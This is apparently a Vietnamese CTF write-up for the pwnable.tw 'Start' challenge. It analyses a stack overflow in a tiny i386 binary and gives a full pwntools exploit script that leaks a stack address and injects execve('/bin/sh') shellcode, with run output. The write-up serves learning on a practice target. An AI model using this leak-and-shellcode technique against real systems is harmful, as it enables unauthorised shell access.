+++
title = 'Pwnable.tw - Start'
date = 2026-01-31T09:24:12+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## Start

`nc chall.pwnable.tw 10000`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/start/start
Arch:       i386-32-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX disabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

Không bật bảo vệ nào, `NX disabled` nên stack ghi được và chạy được luôn. Binary `statically linked`, viết bằng assembly thuần, cả `.text` chỉ có 2 hàm:

```asm
08048060 <_start>:
 8048060:  push   esp
 8048061:  push   0x804809d            ; _exit
 8048066:  xor    eax,eax
 8048068:  xor    ebx,ebx
 804806a:  xor    ecx,ecx
 804806c:  xor    edx,edx
 804806e:  push   0x3a465443           ; "CTF:"
 8048073:  push   0x20656874           ; "the "
 8048078:  push   0x20747261           ; "art "
 804807d:  push   0x74732073           ; "s st"
 8048082:  push   0x2774654c           ; "Let'"
 8048087:  mov    ecx,esp
 8048089:  mov    dl,0x14
 804808b:  mov    bl,0x1
 804808d:  mov    al,0x4
 804808f:  int    0x80                 ; write(1, esp, 0x14)
 8048091:  xor    ebx,ebx
 8048093:  mov    dl,0x3c
 8048095:  mov    al,0x3
 8048097:  int    0x80                 ; read(0, esp, 0x3c)
 8048099:  add    esp,0x14
 804809c:  ret

0804809d <_exit>:
 804809d:  pop    esp
 804809e:  xor    eax,eax
 80480a0:  inc    eax
 80480a1:  int    0x80                 ; exit(0)
```

Viết lại cho dễ nhìn:

```c
push("Let's start the CTF:");   // 0x14 bytes trên stack
write(1, esp, 0x14);
read(0, esp, 0x3c);             // buffer 0x14 nhưng đọc 0x3c
esp += 0x14;
ret;
```

#### Stack Overflow

Buffer là `0x14` bytes nhưng `read` cho nhập tới `0x3c` bytes. Sau `add esp,0x14` thì `ret` sẽ pop dword nằm ngay sau buffer, nên:

```js
offset = 0x14 = 20
```

Không cần `cyclic`, offset đọc thẳng ra từ `add esp,0x14`.

Còn lại một vấn đề: stack có ASLR nên chưa biết ghi shellcode vào đâu để nhảy tới.

### 2. Khai thác

#### Leak stack address

Thay vì ret vào shellcode luôn, ta ret về `0x8048087` - chính đoạn `write` ở trên:

```asm
 8048087:  mov    ecx,esp
 8048089:  mov    dl,0x14
 804808b:  mov    bl,0x1
 804808d:  mov    al,0x4
 804808f:  int    0x80
```

Nó lấy `esp` tại thời điểm chạy rồi in ra `0x14` bytes từ đó. Vì `ret` vừa pop địa chỉ trả về nên `esp` đang trỏ vào chính vùng payload của ta, 4 bytes đầu leak ra là một con trỏ stack.

```py
offset = 20
write = 0x8048087

payload = b'A' * offset + p32(write)
sa(b':', payload)

stack = u32(r(4)) + 0x14
```

Cộng `0x14` vì ở payload vòng 2, shellcode nằm ngay sau `offset + 4` bytes, lệch đúng `0x14` so với giá trị vừa leak.

#### Shellcode

Sau khi `write` chạy xong thì luồng tiếp tục xuống `read(0, esp, 0x3c)` lần nữa, lúc này đã biết địa chỉ stack nên ret thẳng vào shellcode.

```py
shell = asm(
    '''
    xor     eax, eax
    xor     edx, edx
    push    eax
    push    0x0068732f      ; "/sh\0"
    push    0x6e69622f      ; "/bin"
    mov     ebx, esp
    push    eax
    push    ebx
    mov     ecx, esp
    mov     al, 0xb
    int     0x80            ; execve("/bin/sh", argv, NULL)
    ''', arch='i386'
)

payload = b'A' * offset + p32(stack) + shell
s(payload)
```

Buffer chỉ còn `0x3c - 24 = 36` bytes nên dùng shellcode viết tay 24 bytes, không dùng `shellcraft.sh()` cho gọn.

Chạy local:

```bash
(pwn) ➜ lwd3c@Lenovo-LOQ-15IRH8  ~/Desktop/Pwn/pwnable.tw/start  ./exploit.py
[+] Starting local process '/home/lwd3c/Desktop/Pwn/pwnable.tw/start/start': pid 151298
[*] Switching to interactive mode
cat: home/start/flag: No such file or directory
```

Local không có `/home/start/flag` nhưng `cat` chạy được tức là đã có shell. Sau đó bắn remote đọc flag.

```py
#!/usr/bin/env python3

from pwn import *

exe = ELF('start', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
r      = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)
rl     = lambda proc=None: proc.recvline() if proc else p.recvline()
ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)

def GDB():
    gdb.attach(p, gdbscript="""
        b*_start+55

        """)

if args.REMOTE:
    p = remote("chall.pwnable.tw", int("10000"))
else:
    p = process([exe.path])
    if args.GDB:
        GDB()

offset = 20
write = 0x8048087

shell = asm(
    '''
    xor     eax, eax
    xor     edx, edx
    push    eax
    push    0x0068732f
    push    0x6e69622f
    mov     ebx, esp
    push    eax
    push    ebx
    mov     ecx, esp
    mov     al, 0xb
    int     0x80
    ''', arch='i386'
)

payload = b'A' * offset + p32(write)
sa(b':', payload)

stack = u32(r(4)) + 0x14

payload = b'A' * offset + p32(stack) + shell
s(payload)

sl('cat home/start/flag')
p.interactive()
```
